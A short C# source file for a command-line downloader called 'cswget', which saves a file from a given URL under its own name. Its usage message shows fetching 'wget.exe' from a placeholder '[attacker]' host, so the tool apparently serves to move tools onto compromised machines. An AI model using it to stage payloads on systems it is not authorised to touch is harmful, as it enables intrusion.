using System;
using System.Net;

class cswget
{
    static void Main(string[] args)
    {
        if (args.Length == 1)
        {
            string filename = null;
            Uri _uri = new Uri(args[0]);
            filename = _uri.Segments[_uri.Segments.Length - 1];
            Console.WriteLine(filename);
            WebClient webClient = new WebClient();
            webClient.DownloadFile(args[0], filename);
        }
        if (args.Length == 0)
        {
            Console.WriteLine("Usage:\r\n  e.g. cswget.exe http://[attacker]/wget.exe");
        }
    }
}